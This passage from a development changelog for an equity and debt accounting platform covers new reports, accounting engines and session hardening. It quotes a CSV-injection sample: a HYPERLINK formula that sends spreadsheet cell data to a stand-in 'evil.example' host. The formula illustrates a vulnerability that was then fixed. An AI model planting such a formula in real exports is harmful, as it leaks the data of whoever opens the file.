`equityTerms`; `TermDebtInputs` backs TERM_LOAN, CONVERTIBLE_NOTE, and PREFERRED_STOCK's
liability-classified `debtTerms` — the same "reuse over reinvention" principle the
engine layer itself follows, applied to the UI). Each type's own state is kept
independently as you switch the type dropdown back and forth, so exploring different
types no longer discards what you'd already entered for one of them.

An "edit as raw JSON instead" escape hatch remains, per type, seeded with the current
guided-form state's JSON — switching back to the guided form discards any raw-JSON
edits made in that view, a deliberate, stated trade-off (there's no general way to parse
arbitrary JSON back into the specific typed field state without risking silently
dropping something it contained), not an oversight. **What this pass does NOT add:**
client-side shape validation beyond what the guided fields structurally constrain — a
decimal field is still just a text input, so a non-numeric value isn't caught until
`termsValidation.ts` rejects it server-side with a field-level message (now surfaced in
the form's error banner, listing every path and message together, not just the ASC
citation of the first one). Closing that gap for real still needs the Zod swap
`termsValidation.ts`'s own doc comment describes.

**Editing/delete flows.** Entities and stakeholders — the two models with no periodic
accounting of their own — now have real inline rename/edit and delete controls
(`EntityRowActions.tsx` on the home page, `StakeholderRowActions.tsx` on the cap table
page), backed by new `PATCH`/`DELETE` routes (`/api/entities/:id`, `/api/entities/:id/
stakeholders/:stakeholderId`). Deleting either is blocked with a clean, specific error
—never a raw Postgres foreign-key-violation message — whenever something still depends
on it: an entity needs zero stakeholders, instruments, AND documents (the route also
found and had to account for a real wrinkle here: `EntityAccess` is `ON DELETE
RESTRICT` into `Entity` too, and every entity has at least one such row by construction
— its creator's OWNER grant — so a naive delete would always fail even on an otherwise-
empty entity; the route deletes an entity's `EntityAccess` rows in the same transaction,
since access-control rows aren't independent data worth blocking a delete over once the
entity itself is gone); a stakeholder needs zero instruments. Entity delete requires
OWNER specifically (the same bar as granting/revoking access); everything else uses the
existing EDITOR bar. **Deliberately NOT covered, and not silently missing:**
INSTRUMENTS have no edit or delete flow at all — an instrument's terms change through
the existing versioned-modification/correction workflow (a new `InstrumentTermVersion`
row, per ASC 250), never an in-place edit, and there is no delete because an
instrument's audit trail (term versions, closed schedule entries, journal entries) must
never be capable of disappearing. This is a considered design boundary carried over
from the schema itself, not a gap this pass ran out of time for.

**General UX cleanup was intentionally kept narrow, not attempted as a full redesign**:
this pass added a consistent small shared style vocabulary for form fields
(`FieldPrimitives.tsx`'s `labelStyle`/`inputStyle`/`hintStyle`/`fieldsetStyle`) so the
new per-type forms look uniform, and surfaced `termsValidation.ts`'s full issue list
(path + message per problem) in the instrument form's error banner instead of just the
top-level error string. It did NOT attempt a visual redesign, responsive/mobile layout,
accessibility audit, or navigation restructuring — those remain open, ordinary
"front-end polish" work, not called out elsewhere in this README because they were
never specifically flagged as a gap the way the JSON-textarea and missing edit/delete
flows were.

**Still not executed in this sandbox**, same caveat as every file under `src/app/`: no
installed Next.js/React here, so this entire pass was built and verified by careful
manual review against the exact engine/schema shapes (cross-checked field name for
field name against `dispatch.ts`'s `*InstrumentTerms` interfaces and
`termsValidation.ts`'s validators), not by running it.

## Reporting functionality and system/filing integration steps (v0.19.0)

This is the phase after the four roadmap items (auth/multi-tenancy, instrument
coverage, deepened validation, front-end polish — all through v0.18.0): reporting
functionality across four areas the user asked for by name, plus a design document for
system/filing integrations. 226/226 tests pass (up from 209 at v0.18.0 — 17 new tests
across three new modules, zero changes to any existing test).

**1. Financial statement support.**
`reporting.ts` gained two new pure functions, both reusing existing aggregation rather
than re-deriving it: `buildAccountRollForward` (beginning balance / period activity /
ending balance per account, built on top of the existing `summarizeByAccount` — a
roll-forward is just two account summaries, before-the-period and during-the-period,
merged) and `buildStockCompDisclosure` (the ASC 718-10-50-2(g) "unrecognized
compensation cost and weighted-average remaining recognition period" footnote table,
computed from each equity-comp instrument's total grant-date fair value against its
cumulative recognized expense to date). Both are wired to a real page and API route
(`/reports/financial-statements`, `GET /api/reports/financial-statements`) that reads
only closed/reported rows, same rule as the existing journal-entries report. **Scope
cut, stated plainly**: the disclosure table excludes stock-settled SAR — its expense is
a fair-value remeasurement each period (`stockAppreciationRights.ts`), not amortization
of a fixed grant-date total, so "unrecognized cost" isn't a meaningful number for it the
way it is for an option/RSU/restricted grant.

> **PINNED FOR FUTURE WORK — additional ASC 718 footnote disclosures.**
> `buildStockCompDisclosure` covers exactly one of the several disclosures ASC
> 718-10-50-1/50-2 actually requires in a full stock-compensation footnote — the
> unrecognized-cost-and-remaining-period item at 718-10-50-2(g). Not yet built, listed
> here so it isn't rediscovered from scratch:
> - **(a)** A description of the plan(s), including general terms (vesting conditions,
>   maximum contractual term).
> - **(b)** The method and significant assumptions used to estimate grant-date fair
>   value (expected volatility, expected term, risk-free rate, dividend yield) — the
>   inputs `blackScholes.ts` already consumes per grant exist; this would be the
>   aggregated, disclosure-formatted rollup of them across a period's grants, which
>   nothing currently produces.
> - **(c)** A rollforward of award/option activity for the period: outstanding at the
>   beginning and end of the period, granted, exercised, forfeited, and expired, each
>   with a weighted-average exercise price (for options) — genuinely different from the
>   expense roll-forward `buildAccountRollForward` computes, which rolls forward dollar
>   amounts by account, not award counts by status.
> - **(d)** Weighted-average grant-date fair value of awards granted during the period.
> - **(e)** Total intrinsic value of options/SARs exercised and total fair value of
>   awards that vested during the period.
> - **(f)** For awards outstanding and awards vested/expected to vest: number,
>   weighted-average exercise price, aggregate intrinsic value, and weighted-average
>   remaining contractual term.
> - **(h)** Total compensation cost recognized in the income statement for the period,
>   and any related recognized tax benefit.
> - Cash flow statement effects: cash received from option exercises and any actual
>   tax benefit realized from exercised/vested awards.
>
> Every one of these is computable from data this platform already has (grant terms,
> tranches, schedule rows) except (b) and (e)/(f)'s intrinsic-value pieces, which need a
> per-period market/FMV-at-exercise input this codebase doesn't currently collect
> anywhere — same "manual fair value entry only for now" gap `fairValueRemeasurement.ts`
> already flags for liability-classified instruments. Whoever picks this up should add
> these as further exports alongside `buildStockCompDisclosure` in `reporting.ts`, not
> as a replacement for it.
>
> **UPDATE, v0.20.0**: (c) and (e) are now built, exactly as further exports in
> `reporting.ts` as asked above — see the "Equity compensation footnote disclosures,
> continued" section below. (b) and (f) are still not built. The "needs a per-period
> FMV-at-exercise input this codebase doesn't collect" blocker on (e) turned out to
> just mean no function existed yet that would take that FMV as a given input and do
> the arithmetic — it now does, the same "given input" pattern this codebase uses
> everywhere else it would otherwise need to reach into a different Topic's data.

**2. Cap table / equity reports.** Two additions. First, a real downloadable export
(`GET /api/reports/cap-table-export`, linked from the cap table page) — previously the
only way to get cap table numbers out of this app was copy-pasting an HTML table.
Second, and bigger: `exitWaterfall.ts` (new module, 7 tests, all hand-computed) — a
liquidation-preference waterfall calculator (seniority stacking, participating vs.
non-participating preferred, participation caps) that nothing in this codebase computed
before. **Read this module's own doc comment before trusting it on a real deal**: it's
a standalone calculator with ad hoc inputs, NOT wired to `PreferredStockInstrumentTerms`
— that shape has no seniority/participation/liquidation-preference-multiple fields to
read (`preferredStock.ts`'s own SCOPE note already said this wasn't modeled). It also
uses a documented simplified conversion test (compare a class's stated preference
against its pro-rata share of total proceeds if everything were already common) rather
than a full simultaneous multi-class equilibrium solve, and a participation cap's
clawed-back excess is reported as `undistributed`, never automatically reallocated to
other classes. Reachable at `/reports/exit-waterfall`.

**3. Tax filing support.** `taxElections.ts` — five fully-tested IRC calculators
(ISO $100k limit, AMT preference on ISO exercise, IRC 83(b) elections, QSBS/Section
1202 exclusion, debt-side OID/market discount) — existed since before this version but
had **zero callers outside its own test file**. Six new API routes under
`/api/reports/tax/*` fix that, and a page (`/reports/tax`) gives three of the five
(QSBS, 83(b), ISO $100k) an actual form; AMT-on-exercise, OID, and market discount stay
API-only for now — flagged in `TaxCalculators.tsx` rather than silently only building
the easy three. **The real gap these routes expose rather than paper over**: none of
this platform's terms shapes capture the data a real report would need to run against
stored instruments — no ISO/NSO flag or tax-purpose grant-date FMV on `STOCK_OPTION`
terms, no 83(b)-election-filed-date field on `RESTRICTED_STOCK` terms. Every one of
these routes is a calculator a preparer feeds by hand, not yet a report that reads an
entity's actual cap table. See `INTEGRATIONS.md`'s gap #5 for the schema work that
would close this.

**4. Compliance / audit reports.** The real, load-bearing addition here isn't the
report — it's a schema change underneath it. `InstrumentTermVersion` and `Correction`
gained a nullable `createdByUserId` column (migration in `db/schema.sql`, populated in
the three routes that write these rows: `POST /api/instruments`, `POST /api/instruments/
:id/modifications`, `POST /api/instruments/:id/corrections/commit`) — before this
version, there was no way to answer "who made this change," at all, ever, for any
instrument. It's nullable **permanently**: every row written before this migration has
nothing to backfill from, so a real audit trail against pre-v0.19.0 data will always
have gaps, and this is surfaced honestly rather than hidden — the new `auditTrail.ts`
module's `summarizeAttributionCoverage` computes exactly what fraction of a trail has a
known "who," and the audit-trail page (`/reports/audit-trail`,
`GET /api/reports/audit-trail`) displays that percentage prominently rather than just
quietly rendering "unknown" in a few table cells. The trail itself merges every
`InstrumentTermVersion` and `Correction` for an entity into one chronological,
human-readable timeline — a "what and when" (and now, partially, "who"), explicitly
NOT a recomputation of any numbers (see the journal-entries/financial-statements
reports for those). Requires EDITOR, not just VIEWER — this app's role model has no
distinct "auditor" role yet, and EDITOR-and-above is the closer fit for now.

**System/filing integration steps.** `INTEGRATIONS.md` (new file, project root) is a
design document, not code — it inventories what this platform already exports that a
real integration would build on (the CSV cap table export, the journal-entries report,
the `Document.storageUrl` pointer model), the candidate vendor categories (cap table
platforms, GL/accounting systems, 409A valuation vendors, e-signature, tax e-filing,
payroll), the concrete architectural gaps that block ANY live integration today (no
per-entity credential storage, no background job runner, no webhook receiver
infrastructure, no conflict-resolution model for two-way sync, and the same terms-
schema gaps the tax-reporting section above hit), and a three-phase rollout (file-based
export — done, this version; one-way scheduled push; two-way OAuth with webhooks) sized
to how much of that missing infrastructure each phase actually needs. It also flags a
filing-specific fact worth knowing before anyone scopes an "83(b) integration": the
election is a paper mail-in to the IRS, not an e-file target, so the real feature there
is document generation and deadline tracking, not a filing API.

**Still not executed in this sandbox**, same caveat as every file under `src/app/`: no
installed Next.js/React/Prisma Client here — every new route and page was written and
cross-checked against the exact engine/schema shapes, not run. The new engine modules
(`exitWaterfall.ts`, the `reporting.ts` additions, `auditTrail.ts`) ARE fully unit
tested and run clean under `npm test`, same rigor bar as every prior version.

## Stock option/RSU settlement accounting, and three production-readiness fixes (v0.20.0)

After the "fully-fledged platform" and communications/e-signature/ERP-integration
requests were captured in the task-status spreadsheet and the "Open items" section
below, one item from that batch was a genuine accounting-engine gap rather than a
documentation or vendor-decision item — building it directly, rather than only
recording it as a future task, was the more useful response. Three smaller,
purely-engineering items from the same spreadsheet got fixed alongside it. 234/234
tests pass (up from 226 at v0.19.2 — 8 new tests in one new module).

**1. Stock option exercise / RSU settlement accounting — the real gap.**
`vesting.ts` (and `restrictedStock.ts`, `stockAppreciationRights.ts`) only ever built
the grant-to-vest compensation *expense* schedule; nothing in this codebase modeled
what happens the moment an option is actually exercised or an RSU actually settles.
`optionSettlement.ts` (new) covers both settlement paths: `buildCashExerciseEntry` for
a cash-paid exercise (cash received plus the previously-recognized grant-date value
both flow into Common Stock), and `buildNetShareSettlementEntry` for a cashless net
settlement — one function covers both a net-exercised stock option and a net-settled
RSU, since an RSU is exactly the option case with a zero exercise price. Shares are
withheld to cover the exercise price (options only) and/or the employee's tax
withholding obligation; the withheld-tax portion books to a `Payroll Tax Withholding
Payable` liability, cleared by a separate `buildTaxWithholdingRemittanceEntry` when the
cash is actually sent — a deliberate two-step split, since remittance routinely happens
on a later payroll-tax deposit schedule, not the instant shares are withheld. Reachable
via `POST /api/reports/settlement` and the `/reports/settlement` calculator page, same
"standalone calculator, not yet wired to stored instrument data" pattern the exit
waterfall and tax calculators already use. See the module's own doc comment for what's
deliberately NOT modeled: ISO/NSO-specific withholding (blocked on the same terms-schema
gap noted elsewhere), a warning when withholding exceeds the maximum statutory rate (a
real ASU 2016-09 equity-classification risk), and cash-settled SAR settlement (already
covered by that instrument's existing liability-remeasurement schedule — clearing it at
settlement needs no new logic).

**2. A real bug, found by the new tests: `FixedDecimal.toFixed(0)` always rounded up.**
`decimal.ts`'s `toFixed()` had never been called with `decimalPlaces: 0` anywhere in
this codebase before `optionSettlement.ts`'s whole-share rounding needed it. Its
carry-detection logic compared string lengths to decide whether rounding had carried
into the integer part — a comparison that happens to break exactly at zero decimal
places, where a *non*-carrying result (`0`) and a genuine carry (`1`) are both
one-character strings, so every call silently added 1 regardless of the actual value
(`3700.toFixed(0)` returned `"3701"`). Fixed by comparing the rounded fraction
numerically against `10^decimalPlaces` instead of comparing string lengths — verified
against fourteen hand-picked values (see the fix's own comment in `decimal.ts`), and the
existing `toFixed(2)` behavior every other module relies on is unchanged.

**3. Financial-statements N+1 query, fixed.** `GET /api/reports/financial-statements`
ran one `scheduleEntry.aggregate` call per equity-comp instrument inside a loop —
flagged as a self-identified gap when the route was first built (v0.19.0), now batched
into a single `scheduleEntry.groupBy` call before the loop.

**4. Baseline security response headers.** `middleware.ts` now sets
`Strict-Transport-Security`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy`, `Permissions-Policy`, and a first-pass Content-Security-Policy on
every response. This is the application-level header half of the "TLS/HTTPS + security
headers" and "CSP headers" items from the Security Hardening area of the task-status
spreadsheet; TLS issuance itself remains Vercel's job at deployment (`DEPLOYMENT.md`).
Not addressed here: Cloudflare/WAF/DDoS protection (edge infrastructure, not something
application middleware can do) and a full CSRF-token audit (the session cookie already
sets `sameSite: "lax"` + `httpOnly` + `secure` in production, a real but partial
mitigation — see the Open items section).

**Still not executed in this sandbox** — same caveat as everywhere else. `optionSettlement.ts`
and its 8 tests run clean under `npm test`; the API route and calculator page were
written and cross-checked against that engine's exact shapes, not run in a browser.

## Five more items closed out from the task-status list (v0.20.0, continued)

Picking up where the section above left off — working straight through the
spreadsheet's incomplete items, per the "keep going" request. 245/245 tests pass (up
from 234 — 11 new tests: `pagination.test.ts`'s 8, plus 3 more in
`reportingExtras.test.ts`).

**1. Pagination on list endpoints.** New shared helper `src/lib/api/pagination.ts`
(`parsePagination`/`paginationMeta`/`paginateArray`, 8 tests) wired into `GET
/api/instruments` and `GET /api/entities/:id/stakeholders` — real database-level
`skip`/`take`, since these are true lists with no aggregate that needs the full set —
and into `GET /api/reports/journal-entries` and `GET /api/reports/audit-trail`, which
paginate only the row list in the response, since their account-summary/reconciliation
and attribution-coverage aggregates are only correct computed over every filtered row,
not one page of it. Both are documented as deliberate, not inconsistent, in the
helper's own doc comment. `?page=`/`?pageSize=` (default 50, capped at 200); every
paginated response now includes a `pagination: { page, pageSize, totalCount,
totalPages }` object.

**2. Trimmed over-fetched API responses.** Four routes' broad Prisma `include` blocks
became field-narrowing `select` blocks: `cap-table-export` (was pulling every
`Stakeholder` column — including phone and address — into memory just to read a name),
`audit-trail` (was pulling full `Stakeholder` and `User` rows, password hash included,
just to read a name and an email — worth knowing given that route's own comment on who
gets to see it), `journal-entries`, and the equity-comp instrument query inside
`financial-statements`.

**3. The N+1 fix's sibling — batched, not narrowed, where narrowing wasn't the issue** —
already covered in the section above; grouped here only in the spreadsheet's own
Performance & Scaling area, not duplicated in this writeup.

**4. Free CI security scanning, actually configured.** `.github/dependabot.yml` (npm +
GitHub Actions ecosystems, weekly) and `.github/workflows/codeql.yml`
(javascript-typescript analysis on every push/PR to `main` plus a weekly scheduled run)
— both take effect automatically the moment this repository lives on GitHub
(`DEPLOYMENT.md`), no account or secret to set up beyond that.

**5. Settlement/exercise activity now has an ASC 718 disclosure rollup.**
`reporting.ts`'s new `buildSettlementActivityDisclosure` (3 tests) aggregates a batch of
settlement transactions — the outputs `optionSettlement.ts` already computes — into the
shares-issued, cash-received, and tax-withholding totals a disclosure footnote actually
presents, reachable via `POST /api/reports/settlement` with `mode: "ACTIVITY_SUMMARY"`.
Same "ad hoc input, not a query over persisted data" limitation as `optionSettlement.ts`
itself: this platform still has no stored exercise/settlement event to query a real
period's activity from. Intrinsic value realized — the rest of the pinned "additional
ASC 718 footnote disclosures" gap this session originally left open — is now built too,
as `reporting.ts`'s `computeIntrinsicValueRealized` (see the "Equity compensation
footnote disclosures, continued" section below); tax benefit recognized remains open,
needing entity-specific tax-position data beyond what this platform models.

**Still not executed in this sandbox** — same caveat as everywhere else. All new/changed
code runs clean under `npm test`; the route changes were cross-checked against Prisma's
documented `select`/`skip`/`take` behavior, not run against a real database.

## A real vulnerability found and fixed, plus HTTP caching (v0.20.0, continued again)

Still working through the task-status list. 266/266 tests pass (up from 245 — 21 new
tests: `csv.test.ts`'s 12, `caching.test.ts`'s 9).

**1. CSV/formula injection in the cap table export — found and fixed.** The
"free-text field injection/XSS review" item turned up no browser-XSS finding (this app
never uses `dangerouslySetInnerHTML`/`innerHTML` anywhere, confirmed by search, so
every free-text field already goes through React's default JSX escaping) — but it did
turn up a real one: `GET /api/reports/cap-table-export`'s CSV writer only escaped
quotes, commas, and newlines. A stakeholder named, say,
`=HYPERLINK("http://evil.example/"&A1,"Open")` would become a **live, clickable
formula** the instant that exported file is opened in Excel or Google Sheets — the
well-known "CSV injection" attack class, capable of quietly exfiltrating the row's own
data through the link. Fixed in a new shared module, `src/lib/api/csv.ts` (12 tests),
per OWASP's documented mitigation (a leading single quote on any value starting with
`=`, `+`, `-`, `@`, a tab, or a carriage return), wired into the export route.

**2. HTTP caching headers (ETag / Cache-Control).** New `src/lib/api/caching.ts` (9
tests) computes an ETag from a response body and honors a client's `If-None-Match`
with a real `304 Not Modified`, alongside a `private, max-age=0, must-revalidate`
Cache-Control header — see that module's doc comment for why not a longer max-age
(this is authenticated, entity-scoped financial data that can change between two
requests; the bandwidth win here is the 304 path skipping the response body, not a
longer-lived cache). Wired into the three clearest "read-only report" endpoints:
`GET /api/reports/journal-entries`, `GET /api/reports/audit-trail`, and
`GET /api/reports/cap-table-export`.

**3. Query performance / index audit — reviewed, no change made, and here's why.**
The schema already has `@@index` coverage on every hot-path foreign key and the actual
multi-column patterns the engines query by (`Instrument.entityId`,
`InstrumentTermVersion`'s `[instrumentId, effectiveDate]`, `ScheduleEntry`'s
`[instrumentId, periodEnd]`, `JournalEntry`'s `[instrumentId, date]`, and more).
Guessing at a further composite index without a real query plan from actual production
data risks adding index-maintenance overhead for a change that might not even be the
right one — this stays a genuine "Not started, best done once there's real usage data
to profile against" item rather than a change made speculatively just to mark it done.

**Still not executed in this sandbox** — same caveat as everywhere else.

## Session security hardening: idle timeout and "log out everywhere" (v0.20.0, continued again)

Still working through the task-status list. 273/273 tests pass (up from 266 — 7 new
tests in `session.test.ts`). This closes two of the three pieces of the "Session
security hardening (idle timeout, concurrent-session limits, 'log out everywhere')"
item; the third (concurrent-session limits) is deliberately deferred — see below for why.

**1. Sliding idle timeout.** Previously a session token, once issued, was good until
its fixed 7-day expiry no matter how long the account sat unused. Now `session.ts`
carries an `issuedAt` timestamp in the token payload, and a new `refreshSessionToken`
function pushes `expiresAt` forward by another 7 days on every single request —
`middleware.ts` calls it on every verified request and reissues the cookie. That alone
would let a token live forever as long as *something* keeps using it, so it's capped by
an absolute maximum of 30 days from the original `issuedAt`, never extended past that
regardless of activity. Both numbers (7-day idle window, 30-day absolute cap) are
reasonable starting defaults, not something you specified — worth revisiting once you
have a real opinion on session length policy.

**2. "Log out everywhere."** A new `User.sessionVersion` column (`prisma/schema.prisma`,
`db/schema.sql`) starts at 0 for every user and is bumped by a new endpoint, `POST
/api/auth/logout-everywhere`. Every session token carries the `sessionVersion` that was
current when it was issued; `authGuard.ts`'s `resolveUserFromToken` — which already
does a `db.user.findUnique` per request to confirm the account still exists — now also
checks that the token's `sessionVersion` still matches the user's current one. Bump the
counter and every previously issued token, on every other device and browser, stops
working on its very next request. The endpoint immediately issues the calling device a
fresh token carrying the new version number, so the device that asked to log out
everywhere else stays logged in itself. `login/route.ts` was also updated to always
stamp a freshly issued token with the user's *current* `sessionVersion`, so a login
using stale cached credentials can't resurrect a session that was already revoked this
way.

Both pieces keep the app's existing architectural rule that `middleware.ts` stays
database-free: the idle-timeout refresh is pure signature/expiry math (no DB call), and
the `sessionVersion` check piggybacks on a DB read `authGuard.ts` was already making, so
neither adds a new round trip to any request.

**3. Concurrent-session limits — not attempted, and why.** Capping how many devices a
user can be logged into at once (and deciding what happens to the oldest session when a
new login exceeds the cap) needs a real, persisted, queryable list of that user's live
sessions to count and evict from — a materially bigger, genuinely stateful change than
anything else in this pass, which works entirely through the token's own signed
contents. This needs your input before it's worth building: how many concurrent
sessions should be allowed, and should the oldest session silently get evicted or
should the user be warned first.

**Still not executed in this sandbox** — same caveat as everywhere else; no test file
exists for the new `logout-everywhere` route itself (consistent with every other API
route here, which relies on hand-review rather than an executed test since
`@prisma/client` and `next` aren't installed in this sandbox), but `session.ts`'s pure
logic (`refreshSessionToken`, the new `sessionVersion`/`issuedAt` fields, backward
compatibility with every pre-existing call site) is fully covered by the 7 new tests.

## Debt modification vs. extinguishment — the ASC 470-50 10% cash flow test (v0.20.0, continued again)

Still working through the task-status list. 289/289 tests pass (up from 273 — 16 new
tests in `debtModification.test.ts`).

When a borrower and lender change the terms of an existing debt instrument — a new
rate, a new maturity, a principal change — GAAP requires a specific numeric test to
decide how big a deal that change actually is: `src/lib/accounting/
debtModification.ts` implements ASC 470-50-40's "10% cash flow test." Discount the
remaining cash flows under the OLD terms and the cash flows under the NEW terms at the
SAME rate (the original debt's own effective interest rate — never the new terms' own
rate, a common real-world mistake this function's signature makes hard to make by
accident), and compare the two present values. A difference of 10% or more means the
change is accounted for as an EXTINGUISHMENT of the old debt (derecognized at a
gain/loss, new debt recorded at fair value); under 10%, it's a MODIFICATION (no
gain/loss, the old debt stays on the books, only the prospective yield and fee
treatment change).

Fees are the other half of this: fees paid to the lender as part of the change are
folded straight into the 10% test itself (added into whichever new-terms cash flow
period they're paid in, per ASC 470-50-40-12) — a fee alone can be exactly what tips a
change from a modification into an extinguishment, and the test above has a dedicated
case covering that. Once the classification is known, those same lender fees get one
of two treatments: part of the old debt's reacquisition price if it's an
extinguishment, or capitalized as additional debt discount (amortized as a yield
adjustment over the remaining term) if it's a modification — reusing the same
"Discount on Debt (contra-liability)" account `debtAmortization.ts` already amortizes,
so it rolls straight into the existing schedule rather than needing a separate
tracked balance. Third-party costs (legal fees, anyone other than the lender) are
expensed immediately either way, and never enter the 10% test at all.

Reachable via `POST /api/reports/debt-modification` (modes `TEST`,
`EXTINGUISHMENT_ENTRY`, `MODIFICATION_LENDER_FEE_ENTRY`, `THIRD_PARTY_COST_ENTRY`) and
a new standalone calculator page at `/reports/debt-modification` — same
"enter-the-numbers-by-hand" calculator pattern as the settlement and exit-waterfall
calculators, since this platform's data model has no "modification event" yet, only
issuance terms and amortization schedules.

**Deliberately out of scope, same "don't guess at what wasn't asked for" discipline as
every other engine here:** troubled debt restructurings (ASC 470-60) are a
substantively different model — often no gain/loss at all even on a large change,
because the creditor is granting a concession due to the debtor's financial
difficulty — and were, as of this writing, their own separate open item; they're now
built too, as their own module (see the "Troubled debt restructuring" section below).
Multi-lender syndications, which
ASC 470-50-40-10 requires testing creditor-by-creditor rather than as one blended
instrument, aren't handled either — this engine tests one creditor relationship per
call, and a syndicated facility needs one call per lender with that lender's own share
of the cash flows.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation and journal-entry logic is fully covered by the 16 new tests, but the API
route and calculator page (like every other route/page in `src/app/`) have never
actually run against a live Next.js server.

## Beneficial conversion feature — ASC 470-20-30 (v0.20.0, continued again)

Still working through the task-status list. 297/297 tests pass (up from 289 — 8 new
tests in `beneficialConversionFeature.test.ts`).

The last gap explicitly flagged in `preferredStock.ts`'s SCOPE note is now closed:
`src/lib/accounting/beneficialConversionFeature.ts` computes the intrinsic value that
GAAP requires be split out when a convertible note or convertible preferred stock is
issued with a conversion price below the commitment-date fair value of the stock it
converts into — the holder effectively got a free, in-the-money option baked into the
instrument, and that value can't be left buried inside it. The calculation: divide the
proceeds already allocated to the convertible instrument (after any other
separately-valued component, like a detachable warrant, is carved out — this function
takes that allocation as a given input, it doesn't perform the allocation itself) by
the number of conversion shares to get the effective conversion price; compare that to
commitment-date fair value per share; multiply the per-share difference (floored at
zero) by the share count; and cap the result at the proceeds actually allocated to the
instrument (ASC 470-20-30-8) — a BCF can never exceed what was received for the
instrument it's embedded in, however deep in the money the feature is. That cap needed
a `FixedDecimal.min` this codebase's hand-rolled decimal type didn't have yet (only
`.max` existed) — added alongside, same one-line reduce-over-comparisons shape.

Debt and preferred stock book this differently, so there are two entry-builders rather
than one: a BCF on convertible debt becomes additional debt discount, amortized as
extra interest expense over the instrument's life through the exact same
"Discount on Debt (contra-liability)" account `debtAmortization.ts` already
amortizes — this function only produces the day-one entry, a caller wiring this into a
real issuance still needs to fold the BCF amount into whatever net-proceeds figure
feeds the amortization schedule itself. A BCF on convertible preferred, by contrast, is
recognized immediately as a deemed dividend against Retained Earnings — mirroring
`preferredStock.ts`'s own accretion-entry pattern exactly, since preferred stock has no
"effective interest" concept to amortize a discount against the way debt does.

Reachable via `POST /api/reports/beneficial-conversion-feature` (modes `COMPUTE`,
`DEBT_ENTRY`, `PREFERRED_ENTRY`) and a new calculator page at
`/reports/beneficial-conversion-feature`.

**Deliberately out of scope**, matching this module's own doc comment: a CONTINGENT
conversion feature — one that only becomes convertible upon a future event like an IPO
or a qualified financing — generally defers BCF measurement until that contingency
resolves (ASC 470-20-30-15/40-1) rather than recognizing it at issuance the way this
module does; this module assumes the instrument is convertible from day one. Also out
of scope: a subsequent "additional BCF" triggered by a later, separate down-round
repricing of an already-issued convertible instrument (ASC 470-20-30-9 through 30-11)
— this only computes the BCF as of original issuance.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation and journal-entry logic is fully covered by the 8 new tests.

## Revolver drawn-balance interest — composing the daily-accrual engine in (v0.20.0, continued again)

Still working through the task-status list. 302/302 tests pass (up from 297 — 5 new
tests in `combinedRevolver.test.ts`).

`buildRevolverSchedule`'s own doc comment has, since it was written, flagged exactly
what it doesn't do: it amortizes a revolving facility's unused-commitment fee and
deferred financing fees, both straight-line, but explicitly excludes interest on
whatever balance is actually drawn — calling that "real, separate follow-on work" that
needs `buildDailyAccrualSchedule`'s genuinely different input shape (dated rate
segments and principal events, for a balance that can change on any day, not just at a
period boundary). That follow-on work is now done: `buildCombinedRevolverSchedule`
composes all three streams — commitment fee, deferred fees, and daily-accrual
drawn-balance interest — into one combined per-period schedule.

Two design choices worth calling out. First, it's backward compatible by construction:
omit the new `drawnBalance` input entirely and it produces exactly
`buildRevolverSchedule`'s existing fee-only output — a strict superset, not a
replacement with different defaults, verified by a test that runs both functions
side by side on identical inputs and asserts identical output. Second, a revolver
genuinely has two different balances in play, and this function keeps them visibly
separate rather than collapsing them into one number: the deferred financing fees'
unamortized balance (a cost being written off over time) is a completely different
figure from the actual drawn liability balance, and conflating them would misstate
both. `endingBalance` on the returned row is the drawn balance — consistent with every
other debt engine in this file using that field for the actual outstanding
principal/carrying balance — with the deferred fees' own unamortized balance still
fully available at `meta.deferredFeeUnamortizedBalance`.

**Still Pending, not Complete, and here's the honest reason why:** this is a
calculation engine, fully tested including a hand-computed mid-period-draw scenario,
but it isn't wired into `dispatch.ts`'s close workflow yet — the same status the
daily-basis accrual engine and the multi-tranche effective-interest engine already
carry in this spreadsheet. `RevolverInputs` and `termsValidation.ts`'s validator would
both need a new `drawnBalance` field, and the REVOLVER terms entry form would need new
fields for rate segments and draw/paydown events, before a real stored `Instrument`
could actually carry this data end-to-end. Building the calculation correctly first,
before touching validation/forms/wiring, is the same order every other engine in this
codebase was built in.

**Still not executed in this sandbox** — same caveat as everywhere else; the pure
calculation logic is fully covered by the 5 new tests.

## SAFEs — ASC 480-10-25-14 classification, issuance, and conversion (v0.20.0, continued again)

Still working through the task-status list. 312/312 tests pass (up from 302 — 10 new
tests in `safe.test.ts`).

SAFEs (Simple Agreements for Future Equity, the YC-originated instrument) are the most
common seed-stage security this platform's target clientele actually sees, and they
raise a real, specific classification question rather than a vague one:
`src/lib/accounting/safe.ts`'s `classifySafe` triages liability vs. equity under ASC
480-10-25-14, which requires liability classification for a freestanding instrument
that obligates the issuer to issue a variable number of its own shares, where the
dollar value of that obligation is fixed at inception. A standard SAFE matches that
description exactly — the investor's dollar amount is locked in today, and the share
count is whatever that amount converts into once a future priced round sets a per-share
price via the cap/discount mechanics — so `classifySafe` defaults to "liability" for a
standard SAFE, not as a conservative guess but because 25-14's criterion is met
literally. Two things flip the answer: a holder-elected cash-settlement alternative
(forces liability under ASC 815-40-25 on its own, checked first since it's dispositive
regardless of everything else), or the uncommon variant where the conversion price is
actually fixed and stated in the agreement itself, which fails 25-14's "variable
number of shares" premise entirely and lands the instrument in equity instead.

The liability path's ongoing accounting is fair-value-through-earnings, every period —
and rather than build a third fair-value engine, this reuses
`fairValueRemeasurement.ts` directly, the exact same engine a liability-classified
warrant already uses, since the roll-forward math (this period's fair value minus
last period's) doesn't care what kind of instrument produced the number. Issuance
records the investment amount received as the day-one fair value by default (a real,
common practical expedient — a from-scratch valuation of the SAFE itself, separate
from the underlying company's own valuation, is comparatively rare for an
early-stage instrument), but if a caller does supply a different, more precise initial
fair value, the difference is booked as a genuine day-one gain or loss line rather than
left as a silent imbalance in the journal entry. Conversion — when a future financing
actually triggers it — derecognizes the SAFE at its carrying value and issues shares,
structurally identical to `convertibleNote.ts`'s own conversion entry: no gain or
loss, since it converts per its own pre-agreed mechanics.

Reachable via `POST /api/reports/safe` (modes `CLASSIFY`, `LIABILITY_ISSUANCE_ENTRY`,
`EQUITY_ISSUANCE_ENTRY`, `CONVERSION_ENTRY`) and a new calculator page at
`/reports/safe`.

**Deliberately out of scope**, per the module's own doc comment: a non-standard SAFE
variant that adds a genuine repayment right (some bespoke forms do) — that's ordinary
